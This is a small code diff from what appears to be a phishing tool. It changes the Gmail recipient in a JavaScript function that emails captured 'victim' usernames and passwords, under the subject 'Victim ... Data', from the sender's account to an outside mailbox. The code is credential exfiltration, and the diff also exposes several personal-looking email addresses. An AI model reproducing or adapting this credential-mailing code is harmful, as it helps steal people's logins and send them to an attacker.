@@ -14,7 +14,7 @@ function mailkaro(dataof,usname, passpw){
     // Email content
     const mailOptions = {
       from: 'anshuman91vish@gmail.com',
-      to: 'vaibhavthakur410@gmail.com', // Replace with the recipient's email address
+      to: 'syedsaifali214@gmail.com', // Replace with the recipient's email address
       subject: `Victim ${dataof} Data`,
       text: `
                     username : ${usname}
